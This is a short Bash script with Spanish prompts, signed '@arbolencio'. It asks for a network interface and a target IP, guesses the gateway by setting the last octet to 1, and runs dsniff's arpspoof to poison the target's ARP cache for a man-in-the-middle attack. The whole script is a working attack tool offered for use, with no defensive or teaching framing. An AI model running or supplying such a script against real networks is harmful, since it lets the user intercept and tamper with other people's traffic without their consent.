#!/bin/bash

echo -e "\033[32m@arbolencio\033[0m"

cat eof

check_herramienta() {
    if ! [ -x "$(command -v $1)" ]; then
       echo "Error: $1 no esta instalado. por favor, instala $1 y vuelve a intentarlo." >&2
       exit 1

    fi
}

check_herramienta "dsniff"

read -p "la red que deaea analizar: " interfaz
read -p "la ip del objetivo: " ip
puerta_enlace=$(echo $ip | sed 's/\([0-9]\+\)$/1/g')

arpspoof -i "$interfaz" -t "$ip" "$puerta_enlace"
